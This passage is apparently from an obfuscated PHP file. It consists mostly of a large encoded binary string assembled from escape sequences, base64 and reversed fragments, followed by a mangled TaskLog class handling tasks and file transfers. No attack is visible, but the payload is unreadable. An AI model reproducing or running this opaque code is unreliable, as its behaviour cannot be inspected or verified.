îÒy_vÓÖông“Ğö¡')."\x78\xc9\xa7\x15\x91\x87\x60\x14\xcd\x83\xf5\xf2\xc9\x7\x77\xef\x3a\x6f\xf7\x3\xdb\x31\x92\x9c\x75\xf2\xee\x93\xef\x1b\xdd\x7e\xdb\xe8\x65\x27\xf2\xcf\x8e\xde\x7b\xaf\x18\xe5\xa8\x9f\xb8\x1c\xab\x40\x6c\x8f"."\xc7\x70\x20\xb7\x19\xa1\xd0\x5d\x28\x49\x3e\xf9\x64\x2\x87\x59\x32\xae\xe3\x89\x85\x54\xd4\xd9\x2\xe3\xb4\x88\x5f\x4\xf0\xd9\xd3\xc4\x16\x2d\x1a\xc7\x7c\xb3\x99\x86\xb1\x5f\x5f\x85\x48\x67\x55\x63\xd5\x94".strrev('üø5É¼!¶D\\àºCÔB.İ<,YPd†ûZTX-@Ô§ª;HÄÇÂ©å[[ô')."\x6c\xe3\x5b\xb4\x16\x7f\x51\x78\xda\xea\xe6\xfb\x8d\xe0\x7\xe9\xce\x43\x5d\xa4\xb0\x5b\xd0\x88\x6e\xf\x99\x45\x59\xef\xb9\xa1\xe\xde\x2b\xf5\x4b\xfb\x46\xce\x82\x1d\x80\xba\x2e\x10\x72\x2f\x40\x3d\xaa\x73".base64_decode('eO7mcqSDAr1Us9iR/Z47Rjf98q2Ld7jzUsEK5MXsWZkTSfqYY/S8S8q/R/I7v8Yyj560fQ==')."\367\205\256\234\114\321\126\221\44\150\242\0\301\176\27\35\341\373\202\134\204\342\373\377\311\52\242\362\314\106\54\331\247\200\145\336\356\302\110\51\357\305\22\56\157\134\66\266\351\362\66\124"."\347\314\217\145\124\316\374\62\277\220\22\373\156\116\4\251\27\244\106\105\366\121\46\331\15\47\362\117\272\261\61\325\47\200\141\126\202\201\4\133\221\21\117\127\60\167\240\72\271\203\143\135"."\xed\xc5\xaa\x2b\x5e\xc4\xe2\xe3\x35\x86\x16\xae\x6d\x48\x4e\x1\xe4\x2c\x4e\xa7\x57\x6e\x57\x58\xee\x51\x20\x45\xb0\xc0\xd4\x2b\xbb\xe1\x1a\x46\x27\x34\x9c\x8c\x3d\xa8\x78\xb1\xf8\xd5\x6b\xa4\xc7\x4b\x11\x84"."\243\142\123\123\340\172\241\122\226\356\222\221\166\177\222\250\350\170\113\45\366\301\212\225\312\347\107\226\201\164\42\304\353\163\70\17\321\320\134\363\33\106\267\157\22\161\370\326\312\75\150\54".base64_decode('z6WVhhmNs+ah/4HLYBpGpQJ7LoCCzMPGJH+G0RrhxIr1DU+45PDFARbDyP1pMCLlyCda6w==')."\x70\xc1\x6\x1d\xa5\xb2\x1f\xc9\x43\xd\xb9\xfb\xa1\x24\xa\xeb\xdd\xa9\xdc\x93\x4f\x5\x6a\x6d\x30\x2f\x4d\x92\xff\x4b\x3e\xf\x7d\x2c\x50\xe4\x47\x7c\x4d\xac\x8c\xde\xec\x80\xe8\x0\x21\x2b\x80\xd8\x3\xa8".strrev('… ¬&¥ØIá8ÜÊšÄü&¡ü|Ö©Æ­SŸÎ~ZrTÓlTJI ~Rş©"U(8¦}')."\136\153\371\260\23\66\37\336\365\142\45\366\256\221\10\205\151\270\213\320\167\330\361\250\73\54\110\10\167\267\207\42\222\136\240\4\120\133\132\43\152\240\253\253\142\202\374\15\77\126\252\361"."\255\221\274\161\322\320\2\164\14\123\122\370\341\121\123\25\206\126\51\126\61\305\14\156\127\371\101\315\214\144\20\34\321\2\3\212\124\343\42\112\6\341\207\227\204\150\162\365\302\5\176\3".base64_decode('Svr8kzG99mMFu/wxeBplfR8CbRMWwRRlgabQoWuqJtco1Uo/2tO5dvFCd2HuQW2BX5MT8Q==')."\312\211\231\354\254\310\317\347\203\334\166\146\305\33\264\200\144\211\237\170\64\152\321\362\113\312\213\340\312\175\51\71\211\271\272\354\47\162\5\327\155\354\202\302\302\5\370\342\207\251\360\371"."\x49\x64\x81\xbf\xb0\x50\x9e\x6d\xf2\x3a\xac\xfc\x63\x7e\x22\x56\xf2\xb\x39\x86\x4a\x9d\x92\x56\xbe\xae\xe4\xb7\x74\x15\xf0\x8\xab\xdb\xa0\x85\xc0\xf4\x1c\xb4\xd4\x0\x46\x4a\xb1\x5d\x40\x33\x20\xa1\xb\x4b"."\x25\x68\x82\xc3\x47\x89\x2d\x69\x48\x95\xf0\x23\x49\x72\xe7\x53\x14\xbe\xde\xd6\xaf\xa7\x15\x61\x7f\x3c\x1b\x37\x96\xc3\x40\xe7\xda\x9d\x14\x28\x18\x6e\x10\x46\x38\x37\xc\x4b\x87\x4\xc\xed\x7b\xce\xcf\x50"."\144\227\63\11\10\313\103\177\105\231\160\244\135\104\350\271\336\221\270\222\151\113\221\130\162\145\265\157\332\306\215\176\203\151\46\62\255\50\126\326\307\163\323\170\322\347\314\217\172\2\103\317"."\63\2\300\235\223\42\325\161\200\105\23\375\323\304\303\116\256\201\250\140\265\304\246\246\205\53\71\253\325\303\322\124\42\124\221\347\216\261\252\106\375\134\206\24\350\54\231\130\312\203\55\21"."\301\214\363\145\104\11\223\217\210\367\2\116\13\340\213\204\73\74\231\224\321\160\240\120\160\120\40\26\301\27\140\131\243\327\317\311\6\275\24\363\245\304\313\111\226\205\20\55\27\34\53\24"."\xba\x12\xb0\x9b\x65\x2\x1e\x44\x14\xd6\x2c\x72\x32\xc7\xe1\xa8\x2e\xe\x4\x34\xc7\xa4\x48\xa2\x3c\x3c\x79\x81\x95\x2a\x1a\x5\xdb\x41\x6\xa9\xdf\xe9\x2a\xe2\x39\x6d\x8d\x36\xa8\xd1\x2c\x55\xa\x88\xee\x9a"."\xaa\x88\xe3\x8b\x2a\xb4\xa4\x69\xa\xa3\x7d\xbc\x81\xb\xf0\xd7\x10\x7f\x9c\x6d\xaa\x22\x9d\xb0\xfa\x75\x1d\x95\x27\xa4\xad\xd2\x47\x50\xc1\x2a\x85\x11\xdf\x9c\xc6\xc7\xb1\x68\x9b\x68\x43\xe5\xf\xf1\xc0\x51"."\145\167\14\36\60\5\42\160\25\71\171\25\375\235\62\231\141\22\361\242\231\105\214\63\171\236\101\310\34\341\316\63\130\44\113\63\201\303\314\256\130\64\21\155\141\116\347\234\262\133\12\233"."\xc9\x4e\x1a\x16\x7d\x83\x2a\xe\x67\xec\x75\x1d\xd7\x4a\x62\x39\x38\x8b\xe1\x7\x8\x60\x43\xb1\x94\xcf\x73\x85\x50\x8c\xaf\x7c\x6b\x6c\xaa\xfc\x67\x25\xb9\x2d\xd5\xd3\x3d\xe3\xa4\x2b\x2b\x35\x76\x97\xa\x2".strrev('÷úÑÔ|=$ïå9d¾<TıLV\'±Õ4­I[í=Su±EöK'."\0".'-éïÀœ&Ñ;B^Ì9zf').strrev('ñÌ7ÔÀCP’0Pá-Œ7ÀK§J8¸õ:-c¦uôU'."\n".'yumZouOj¨ÿ_«+ù')."\xd5\x89\xf7\x85\x86\x25\xec\xf5\xd2\x70\x8b\x6c\xeb\x0\x8f\xaa\xcf\xd1\xad\xa\x43\x43\xef\x5f\x12\x5c\x4d\x55\xcf\x3b\xc4\xb1\x74\x48\xb3\x26\xb3\x24\xdb\x50\x57\x57\xe7\xad\xab\x47\xff\xb3\x77\x17\xcc\x7e".base64_decode('ZWNdXVmWurpG8j9NIHcggILOFEQSGS2HDEM6s83C7MEY+RJjSle24JejCm4aTItQs0XYRw==')."\14\274\62\262\352\160\351\251\20\135\0\210\351\142\20\162\222\33\312\70\30\4\356\163\140\73\273\52\240\306\277\331\266\211\32\325\107\6\10\332\316\37\45\243\154\142\5\315\247\117\305\233"."\x78\x3\x83\xf9\xf4\x4a\xf9\x63\x3e\x36\xd0\x14\x28\xc\xdf\x7b\x59\x82\x57\xf6\x3c\x3\x85\x28\xd1\x13\x77\x89\x8e\xa6\xa1\x32\x4e\x2b\xb2\x18\x82\x98\xa2\x14\xef\x33\x6\x48\x62\x5b\xcc\xfd\x4a\x96\x71\x71"."\124\276\62\44\311\374\145\57\211\145\271\75\22\34\215\360\232\250\203\43\352\355\36\306\260\302\212\354\67\207\124\301\247\340\350\161\74\106\206\24\37\77\31\112\246\245\327\327\170\134\331\376"."\x24\x65\xe7\x8a\x6d\x42\x2b\x8\x18\x38\x62\x64\x63\xc0\x70\x1a\x1\x51\xa5\xa2\xf2\xd8\xce\xc7\x19\x59\x4f\x12\xce\x92\xd8\xdf\x32\x6e\xa8\x17\xb7\xbb\x51\x8c\x22\xa2\x6f\x1\xee\xfa\x89\xea\x41\xb3\xf6\x2a"."\x40\x71\x68\x94\x98\xc6\xa7\x8e\x86\x89\x90\xa7\x71\x62\xd9\x84\xdb\xee\xc9\x26\xf3\xe6\xb8\xf9\x70\x6b\x18\xb2\x98\x34\x7b\xec\x32\x2c\xfe\xd\x4a\x80\xc\x12\x64\x0\x7a\x8d\xd7\xc2\xcd\xca\x4a\x15\xb8\x93"."\134\145\2\364\16\255\254\0\300\313\163\223\253\306\12\271\61\334\225\233\30\220\155\341\166\262\145\253\262\124\76\45\51\233\131\340\15\104\150\372\260\72\6\245\323\252\257\120\64\373\20\46"."\130\362\240\41\170\127\145\60\317\136\236\263\102\46\336\172\71\237\14\304\227\232\314\203\71\240\226\60\160\240\245\371\346\51\145\25\76\13\45\240\163\205\113\11\55\334\103\233\14\304\307\140"."\x59\xb7\x8b\x9c\x3a\x9c\x75\xe0\xf3\xb5\x13\xc2\x5b\xf6\x35\x48\xc7\xc4\x21\x36\xb8\xb7\x97\xd5\xa1\x69\x36\x41\xa5\xb0\xa8\x4a\xf6\xa7\xa9\x3a\xd0\x84\xe1\x2a\x53\x25\xc3\x23\x24\x94\x36\x9c\x70\xa\xa3\x2".base64_decode('C8dNcYIQv6yegOYAeSSLClcQZg6Y4w4j7ICmjYxXkYs5014/7TwWuIDlwsPKfZjKd3J4SA==')."\125\131\226\204\127\164\7\167\350\136\1\21\235\310\126\206\125\144\137\307\25\64\162\262\44\305\160\355\354\72\24\35\272\55\52\31\365\140\260\102\35\203\53\330\335\371\44\347\374\224\27\0"."\77\151\46\342\56\261\215\152\271\20\256\253\333\105\242\26\163\52\211\143\274\255\224\265\143\152\260\312\124\137\3\250\350\116\145\176\122\50\215\26\212\30\176\207\360\337\207\120\12\363\132\154".base64_decode('40d97UHnI7HtwCytpGSbfQj3A0JpNmmKcxuWNhVFrghtz4l+LCTqUUjb5xPXGxVSsV0P9g==')."\x35\x6e\xc4\x1b\xb6\x3\x94\xc7\xb4\xf9\x99\x1a\x57\x1f\x48\x4b\xfb\x6c\x58\x66\x8a\x13\xb4\x88\x77\xa1\x68\xaa\x43\xf5\x40\x72\x20\xc0\xb3\xa2\x66\xb0\xc6\x6b\xac\x6d\x44\xd7\x94\x38\x6a\x90\x8e\xf9\xae\xa8"."\133\63\27\227\220\330\40\24\225\266\150\302\40\330\154\217\147\156\32\204\106\53\11\12\252\374\372\45\247\261\300\46\201\134\161\111\21\262\102\373\240\126\136\47\156\101\136\50\324\2\247\123"."\xd4\x53\x66\x31\x8d\x77\x49\xc9\x92\x4e\xde\x8e\xe9\x7d\x72\x94\x68\x39\xb0\x25\x22\x4c\xbc\xcb\x55\x60\xa3\x65\x12\x2d\xc2\x4b\x33\x90\xb2\x4b\xb2\x9\x34\xc9\xb\x4\x8a\x49\x8e\x42\x24\xee\xd5\x5b\xaf\x70"."\266\127\245\65\323\310\164\51\201\344\257\304\1\273\104\275\322\43\71\42\375\212\227\172\371\245\265\213\27\145\357\356\24\231\325\143\17\351\160\5\304\372\24\356\201\45\247\241\152\261\365\165"."\321\63\271\10\371\146\131\21\232\206\271\55\361\342\116\116\261\260\277\217\156\66\213\225\122\52\174\212\44\111\43\232\342\354\67\214\216\30\44\110\30\321\231\52\270\267\276\301\73\3\216\75".strrev('i’ƒšÉ\\è`Ä¢±âºØ“çÅa1'."\r".'|ÂO{ÿ])"|†¤P6Ñ˜™ğ'."\r".'	,-Íƒ¢v<+ò')."\275\320\154\242\272\327\70\103\167\245\164\72\102\70\271\325\241\55\357\312\200\326\207\63\35\34\172\210\306\120\173\124\246\103\173\321\125\11\70\236\221\135\226\220\122\242\37\342\111\1\2\231"."\xd4\x6d\x88\x34\x30\x42\x43\x8b\x9a\xc9\x62\x6f\x26\x38\x91\x13\xe0\x84\xc9\x81\xe5\x5a\x5e\x18\x2b\xa1\x4a\x6a\xae\x0\x8e\xc9\x35\xb5\xd8\x5c\x81\x43\x44\xd9\x39\xc2\x1f\x95\x63\xd\x4a\xbc\x73\x73\x1d\x79"."\x4b\x8e\xb0\x54\x8e\x9c\x96\x23\x42\x35\x46\x1d\xa5\x39\x88\xe7\x1a\xd2\x99\xe5\x1\x76\xbc\xef\xea\xe8\xf2\x73\x50\x33\x5f\x9e\x54\xba\x22\xac\xf0\xb5\x30\xb5\x4c\x7d\x58\x87\x93\xe0\x50\xce\x48\x29\xe1\x68"."\x7b\xa8\x25\x10\x6e\xd\xc5\x17\x2b\x7d\xf8\xca\x56\x68\x2b\xa2\xe6\xaa\x64\xd9\xaa\x96\xf0\xa1\x43\xdc\x8\x39\x17\x38\x91\x4f\xd3\xe9\x60\xb8\xde\xcb\xfd\xd2\xe0\xa0\xb7\x17\x1d\x2e\xbc\x69\x7e\x28\xb3\xc4"."\361\213\364\20\52\23\216\377\234\325\122\254\324\213\145\65\346\361\263\301\154\131\31\54\165\257\220\73\53\204\306\122\346\102\121\57\317\77\242\143\255\111\251\305\122\201\122\205\326\100\376\312"."\137\40\116\205\344\334\210\147\322\363\343\65\336\310\17\32\226\41\310\1\53\61\42\327\36\150\355\14\105\324\100\70\34\135\352\320\72\26\367\15\105\56\175\111\313\76\241\244\231\21\223\100"."\277\136\156\2\22\14\356\311\116\63\134\22\31\72\175\262\205\321\2\273\46\3\107\265\334\321\13\215\112\76\333\12\105\315\260\164\11\100\335\213\325\303\113\74\55\233\165\270\136\315\146\244".base64_decode('aMm531b8lEo/wGCE+x0/QyzU3pH4XzfVSAsrgUaa6avxV9fUB0yL7KqXfVN4GiqH/G993g==')."\x79\xc4\x55\xa3\x4a\x4c\xa9\x31\xaf\x9a\x26\x39\x4b\x1\xa3\x4f\x61\xa1\xa8\x4a\x24\xe9\xaa\xf8\x4\xe2\x62\x8a\x23\x5\xf9\x8a\xd7\x9f\x86\x1a\xb0\x95\xd4\x20\x7b\x76\x84\x23\xe2\x30\x83\x73\x41\x25\xf8\x2b"."\364\210\213\116\356\130\12\311\216\75\114\242\207\310\10\14\270\103\107\323\345\264\317\255\174\357\160\311\127\366\15\342\346\205\246\255\304\275\100\71\173\104\237\120\214\273\165\22\105\335\51\25".base64_decode('GoCSFSEb4xmUJqWO+o/kLnuUBcy2hPgAsWkYzBVsx/G/Q36II00JBWBBUZFL/eicsyieWA==')."\166\31\155\252\362\336\111\350\260\70\24\142\365\115\63\67\122\6\160\210\321\302\254\67\134\221\32\273\71\312\147\114\171\324\11\75\307\157\261\250\133\130\52\235\360\240\363\210\156\227\373\231".base64_decode('o8X//xSkiXHJ5K2zkvIGWe79U/By2IVevznk9BWLIW6neQ53edIKI5YSZAd/zkKeMndTCg==')."\x71\xf5\xad\x20\x62\x4\x73\x8f\x95\x80\xd8\xe9\x97\x64\x96\x3e\x3d\x95\xfe\x24\xe1\x97\xed\x86\xee\x46\x50\x3a\x7\x9f\xac\xe5\xa8\xd8\xd2\x6f\x64\xd3\x45\xae\xde\x25\x0\x9d\xba\x10\x49\x90\x52\x88\xb0\x14"."\x34\xe6\xd2\x9c\xb8\xd3\x6c\x65\x24\x1d\x3c\x5c\x55\xf2\xa4\x88\x2d\x99\x3a\x1d\x75\x9\xff\x67\x62\xeb\x75\xfa\x83\xe2\x3a\x5\x96\x58\x42\x96\xed\xf0\x40\x96\x30\x13\x5a\x9f\x87\xa2\x2a\x26\x8a\x22\xd6\x3c"."\42\207\145\345\176\322\13\224\310\304\206\151\76\337\13\245\14\314\37\151\332\103\234\145\122\272\350\166\241\45\255\117\116\176\345\322\175\304\204\47\350\36\72\136\356\25\321\21\115\147\133\210".base64_decode('IxsF+bVCQVyiyDsu+tfxKBvSuhMdKjFTolLFiLjAOelikwLhkrOUD9HLHAe0KB0eZWPR9A==')."\x82\x47\xbc\xed\x85\xec\xa8\x9d\x5d\xf4\x46\x17\x6\x4c\xae\x92\xdd\xb2\x73\x81\x3c\xa2\x47\xfc\x8c\xed\x2f\xbf\x95\xc7\x6a\x6b\x40\x51\xb0\x9a\x10\xd3\xcf\x1a\x30\xc9\x19\xcd\x27\x9f\xee\x20\x83\xb2\x80\x19"."\x98\x41\x3c\xa7\x57\x60\x89\x63\x4d\x63\xac\x42\xdc\x36\xf5\x4c\x4a\x88\x86\x4c\xdc\x2a\x43\x9\x1f\x4e\xe8\xac\x17\xc8\x4\x7b\xf0\x4a\x77\x3d\x6c\xcc\x81\x19\x8a\xcd\xf2\xd3\x18\x77\x90\x2a\x45\xf9\x8a\x70"."\272\173\243\113\207\374\264\352\31\176\324\302\161\301\134\310\266\232\204\132\220\333\245\151\271\173\126\346\212\225\255\75\360\303\132\301\271\352\270\276\131\75\342\35\370\327\171\221\23\257\216\13"."\150\56\235\216\166\71\153\302\117\63\145\7\42\367\131\210\117\206\253\100\314\75\141\11\263\134\224\55\24\37\34\236\143\245\136\3\155\54\367\76\53\15\203\324\357\122\61\353\41\72\40\36".base64_decode('poJZ0YGtw6ede0IruMD9xgrh+QU5CqadZLNxQW+RXZa7sxkOjEc7uHiKSK1Il+0wy3Pphg==')."\x19\xb3\xe6\xc9\x22\x17\x31\x85\xe2\xa\x19\x2c\xbe\xc0\x4d\x38\x30\x49\x2\x29\x14\x27\x1a\x2a\xcc\x74\xb5\x4c\x3e\x48\xa2\xf3\x3d\x4f\xb9\xb7\x64\xd7\x16\xf2\xbf\x5b\x30\xe2\xf4\x42\xb3\x4a\x6a\xc2\xe5\xe".base64_decode('5ctGgOCppL8m7agubSMTKwBZYtXRPVT4SHZ+i/IfFfohbZxisVC/t2YWn/xz+JrBLmrOAw==')."\x6d\xa5\x73\x1b\x19\x9\x76\x48\xc4\x92\x62\x11\x73\xaa\x6f\x81\x8c\x47\x24\x4b\x7\x3b\xb9\x46\xdb\x74\xb\xa8\x70\x71\xbc\xb1\x12\x61\x6b\x34\x9f\x85\x7d\x1f\x1b\xc9\x10\xab\x4d\xa2\x44\xff\x8b\x9\x64\x67"."\x34\x7a\x9c\x13\x7a\x6b\xb8\xfb\x8e\xa3\xbd\x73\x14\xfc\xc7\x32\x32\x53\xc1\xb7\xb1\xa4\xa6\xf3\x35\x7d\xa0\xac\x22\x3f\x9b\x7a\x35\xdb\x2b\x21\xa7\x24\xe0\xd4\xed\x28\x99\x6c\x20\x17\xe2\x8\xed\xec\xb7\xab".strrev('÷Ÿ—ŠY,eºYºÂÉç’¬İ’ç“µ…ä$q÷Ù¥ÄS‰Fy….J/ÎTËÆQãÑÔLTz')."\x92\x8a\xe4\xf5\x51\x5e\xb5\xe4\xb4\x56\xc8\xad\x88\xa0\xb\x7a\x4\x8b\x9b\xe8\x6d\x90\x66\x6\xda\xf9\xe3\x70\x4d\x52\x42\x74\xa\xd3\x80\x3b\x94\x9c\xb5\xa3\xe1\x93\xfc\x99\x9b\x72\x58\x72\x86\x8c\xf6\x84"."\50\173\275\201\232\343\70\7\243\170\253\313\327\75\241\137\151\27\220\215\31\41\32\302\163\67\141\235\247\1\323\54\233\40\160\234\274\270\127\117\307\111\314\162\273\366\105\234\245\303\337\111"."\xba\xcc\x91\x3a\x90\x51\xf2\x92\x8f\x7e\x4d\xda\x88\xc5\x9e\x2b\x42\x91\x52\x4e\x44\x24\x1\x35\x39\xbe\xf1\x44\x87\xa5\x6\x6c\x92\xd0\x45\x31\x98\xfd\x7\xcb\xe5\x2c\x9c\x5a\x3b\xa7\x61\x76\xca\xf8\x3f\xf6".strrev('¥ZÌ”³3´kœHbAA¾ø4)Àí›œ?Wlb¡:.\\KâÖ‡×Û'."\r".'ïçë€•v:¬í™Ëûj')."\306\356\370\264\154\126\332\222\53\237\216\312\274\225\43\124\34\340\356\251\53\105\334\357\224\335\236\313\127\22\51\62\163\75\336\43\250\12\206\125\52\46\373\73\166\371\72\47\165\41\210\124".strrev('iÇ˜–1ğ¥1Ö¸b>h›,§$n~TOÓp¨‘¼º^&1sNÄœìÌ„tW')."\220\115\30\104\13\354\300\133\13\233\113\317\261\214\10\22\263\51\100\13\145\372\347\0\225\121\315\204\143\162\35\100\171\336\4\151\363\61\274\160\224\350\164\271\143\246\231\54\171\154\35\367"."\x18\xe5\x8a\x1f\xe5\xa5\x39\x41\x91\x8b\xe0\x17\x9\x4e\x91\x1d\x9e\x56\x72\xda\xa9\xf3\xba\x0\xf5\x5e\x57\x75\xdc\x23\xb5\x73\xd1\x38\x5c\x24\x53\x65\x19\xb4\xd2\x62\x58\x34\xc3\x44\x74\xe4\x2a\x8c\x5c\x94"."\x7b\xcb\xcb\xd0\x5\x12\x17\x79\xc6\x59\xa2\x95\x9\x5\x6f\x94\x10\x53\xe2\x90\x3c\x1e\x8c\xe0\x74\x15\x4d\xc2\x7f\x3a\xa1\x5c\x5c\x25\x29\x7f\xa7\x24\x59\xb0\x9b\xa5\xa4\xe0\xa9\xbe\xb2\xcd\x90\xd1\x5e\xc7".base64_decode('TGHtQ3EFm4jGgurSEDa3EVoR7Gbmog2TeFhhVXZ31pDneLAA0OGozRSopCOqKAmmhc1jOw==').strrev('§­”õ´yİ÷ÎÆ5(™ÍÌD¡ƒd´Y”¶R°¸µÎ;÷ã3:•LkfÒİÎÆáhW')."\xcc\x17\x38\x8e\xa\x2b\x67\xd6\xcd\xe8\xf9\xba\x5a\x50\x3a\xcf\x39\xf3\x1b\x72\xc2\x99\x25\x3e\xc3\xcb\x14\x95\x59\x9e\x8a\xe5\x4c\x6a\x1b\xa8\x52\x1a\xc2\xcd\xb8\xed\x40\x22\xe1\x9e\xc7\xed\x96\xa7\xcd\x61"."\x77\xab\x51\x12\xdd\x2a\xc4\x2\x19\xf8\x67\x1a\x67\x6e\x22\x66\x8b\xe0\x58\x5c\x69\x98\x34\x8c\x9f\x8a\xf\xbd\xfc\x56\x9c\xb9\x6c\xc1\x8a\x7f\x7e\x6c\xa0\xc\x3f\x4c\xf1\x13\xfc\x3\x89\xfb\x72\x35\xa7\x32"."\x9d\x27\x2c\x6a\x10\x12\x27\x42\x71\xcb\x8f\x9a\xf0\x25\xbb\x38\x12\x2d\xc6\x72\x91\x32\xc3\x7d\xce\xf7\x66\x52\x79\x22\x87\xa2\xa2\x25\x87\x84\x9\xf4\x1c\x64\x90\x74\xef\x8f\x4e\x79\x69\xa7\x23\x34\x92\x48"."\300\314\162\71\324\40\335\134\73\25\7\370\123\336\262\255\266\144\204\245\144\122\212\131\300\105\277\330\42\101\110\30\220\42\311\364\366\55\60\250\161\33\155\356\122\335\216\23\264\244\146\220"."\42\64\44\130\176\223\54\56\270\45\266\225\25\303\107\160\301\103\270\340\22\315\25\273\242\66\50\230\160\161\10\114\247\333\264\301\12\131\323\272\333\306\36\202\360\254\204\211\227\114\211\210"."\147\104\372\220\374\165\310\47\236\355\70\62\226\103\205\251\21\251\274\270\75\24\335\304\260\112\335\47\64\320\131\134\66\145\302\221\112\200\250\113\53\256\223\43\35\270\261\322\222\120\326\241"."\135\341\162\45\361\111\247\341\24\236\215\317\31\312\103\36\27\172\35\120\227\10\1\213\360\30\313\351\112\2\241\226\124\175\105\331\227\204\2\172\66\54\125\47\153\26\214\133\40\136\371\43"."\2\53\235\103\54\131\234\21\11\214\251\61\35\203\57\355\152\274\143\220\63\46\47\72\232\343\236\132\162\342\25\350\113\201\71\162\1\101\323\2\316\44\232\137\167\265\136\56\340\356\31\55"."\xe1\xf0\x81\x28\xc3\x87\xc\x3b\xd5\x2f\x1d\xcf\xcb\x13\xcb\xe1\xc5\xb2\xc1\x86\x6\x54\xee\x87\xbb\xb5\x6c\xac\xdd\x42\xb\x51\x49\x59\x7b\x24\xb5\xa5\x84\x59\xa1\xc\x6d\x51\xc5\x62\x34\x9\x97\x14\xe7\x20"."\x47\xd9\x71\x86\x0\x97\xa5\x49\xb8\x6c\x59\x32\x2b\x5c\x36\xae\xa4\x9c\xad\x95\xac\x71\xba\x57\x3e\x78\x20\x4\x4b\x57\xe8\xb0\x10\x15\x49\x59\xc7\x1b\xcf\x8a\x99\xcb\x3f\x7\x98\xe8\xce\x4d\xa4\x66\x95\x5b"."\41\204\135\56\105\221\112\255\250\230\171\334\126\270\163\13\256\4\37\166\53\245\70\264\255\234\73\112\45\272\315\122\52\120\152\112\205\306\125\303\22\252\111\345\133\206\110\253\240\50\105\77".strrev('ÛäŞ@ü¥%luL®Ê¡e¤Ä`@lxŠ`@<¸.S'."\n".'œ±•"¬V^²ªëYd…e˜Ù#ù‰')."\x53\x5a\x28\x21\x63\xde\x2a\x50\x74\x8f\x73\x59\x6d\x4e\xd4\xcf\x97\x24\xf3\xf7\x15\xdf\xd1\x78\xb0\x44\xaa\x5c\xda\x93\xd5\xf8\xe3\x46\xa1\xb3\x47\x4f\xd5\xa6\x6d\xa4\x74\xa7\x8d\x7d\xd9\xa6\x25\x4d\x67\x1f".base64_decode('yUryb5foWcjHHKo7FQSyBESDPnELROuTmCOBE44nb5QlgSs3enHfgu/V+JUtMf9Ot3CaHA==')."\x37\x8b\xb6\x7\xa7\x25\xcc\x2\xf9\x6d\x36\x6d\x5b\xe8\xc1\x50\x11\x14\x61\xc4\xf1\x3e\xec\x91\xd4\xbc\x50\x48\xdc\xcf\xe2\x46\x91\xdb\x3e\x82\xb6\x84\x62\x91\x20\xa8\x10\x60\xd9\x4e\x5c\xa7\xa9\x84\xce\x39".base64_decode('IvgWkUfkbRbuCNtKLmUHARgw073mMDMkifBKGiRxY6i5ectB97NrWWmNWFmx/DTFDw6dvA==')."\xa4\xe\xf0\xe2\xea\x5b\x53\xe8\x73\x14\xa7\x7e\x31\xb9\x1e\xfa\xd7\xd5\x0\xb7\x6\xa2\xa\xea\xcd\x85\x88\x70\xe1\x49\x5e\x3c\x11\x2f\x4b\xea\xa\xc4\xe3\x4b\xa3\xb1\x56\xea\xfc\xa5\x2c\x99\x94\x92\x54\x3"."\313\222\272\72\242\221\361\322\202\235\201\120\270\54\15\153\21\106\124\141\222\224\46\205\272\110\53\311\255\371\170\255\10\265\54\26\55\51\267\4\313\56\351\302\340\350\123\314\213\164\151\125"."\xe8\x37\xd9\x5d\x14\xcb\x1f\xd7\xb2\x4c\x5c\x24\x5d\x6a\xe8\x39\x61\xb3\x56\x94\x71\x4a\xc1\xe4\xf9\xb7\x98\x71\x69\x1e\x70\x7a\x5c\x74\x29\xf5\x32\xc4\x86\x8a\xb0\x4e\x60\x4\xea\x8e\x15\x0\x8a\x9d\xe6\x70"."\372\300\371\174\241\230\342\163\50\260\110\160\262\206\10\121\222\160\123\336\357\311\65\46\27\207\221\344\151\25\207\113\276\362\50\277\216\43\251\142\70\160\63\217\63\101\351\164\215\331\53\135"."\267\321\63\27\74\260\207\1\226\264\100\151\330\221\154\153\175\25\265\72\250\354\32\323\14\41\125\376\377\0\273\74\334\47\170\272\0\0"."", 10, -8))); goto Eç¥æÈˆø; EˆÄâËææÔ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($½£ÚÊê¦, $Ñƒ…ãê¡ = '', $„™áÈÍô = 0, $ëŸİî÷ = '') { $È¨ıÑøµ =& $_SERVER[¼èá¯æÙ]; $ëŸİî÷ = $ëŸİî÷ ? $ëŸİî÷ : ($Ñƒ…ãê¡ ? $Ñƒ…ãê¡ : $½£ÚÊê¦); $è§õÇÉÈ = new Task($½£ÚÊê¦, $Ñƒ…ãê¡, $„™áÈÍô, $ëŸİî÷); $GLOBALS[$È¨ıÑøµ[1862] . $½£ÚÊê¦] = new TaskLog($È¨ıÑøµ[1761], $è§õÇÉÈ, $ëŸİî÷); return $è§õÇÉÈ; } public function __construct($úÄº•·´ = '', $º§ÇÏµÊ = '', $ÄûÁÛîĞ = '') { $ŞÛ°’°· =& $_SERVER[¼èá¯æÙ]; if (!$úÄº•·´) { $úÄº•·´ = $ŞÛ°’°·[1761]; } $¼’Åº­Ş = $úÄº•·´ . $ŞÛ°’°·[473] . rand_string(10); if (!$ÄûÁÛîĞ) { $ÄûÁÛîĞ = $úÄº•·´ . $ŞÛ°’°·[53] . $ÄûÁÛîĞ; } switch ($úÄº•·´) { case $ŞÛ°’°·[1761]: if (!$º§ÇÏµÊ || !$º§ÇÏµÊ->task) { return echoLog($úÄº•·´ . $ŞÛ°’°·[1863]); } $«Æ‡Ù¢ = $º§ÇÏµÊ; $¼’Åº­Ş = $«Æ‡Ù¢->task[$ŞÛ°’°·[486]]; $úÄº•·´ = $«Æ‡Ù¢->task[$ŞÛ°’°·[486]]; if (!$«Æ‡Ù¢->task[$ŞÛ°’°·[1666]]) { $«Æ‡Ù¢->task[$ŞÛ°’°·[1666]] = $ÄûÁÛîĞ ? $ÄûÁÛîĞ : $úÄº•·´; } break; case $ŞÛ°’°·[1864]: if (!$º§ÇÏµÊ) { return echoLog($úÄº•·´ . $ŞÛ°’°·[1865]); } $Ó¢·©Šš = is_string($º§ÇÏµÊ) ? array($º§ÇÏµÊ) : $º§ÇÏµÊ; $«Æ‡Ù¢ = new TaskFileTransfer($¼’Åº­Ş, $úÄº•·´, 0, $ÄûÁÛîĞ ? $ÄûÁÛîĞ : $Ó¢·©Šš[0]); foreach ($Ó¢·©Šš as $£ŒÁâÊ) { $«Æ‡Ù¢->addPath($£ŒÁâÊ); } break; case $ŞÛ°’°·[400]: if (!$º§ÇÏµÊ) { return echoLog($úÄº•·´ . $ŞÛ°’°·[1865]); } $Ó¢·©Šš = is_string($º§ÇÏµÊ) ? array($º§ÇÏµÊ) : $º§ÇÏµÊ; 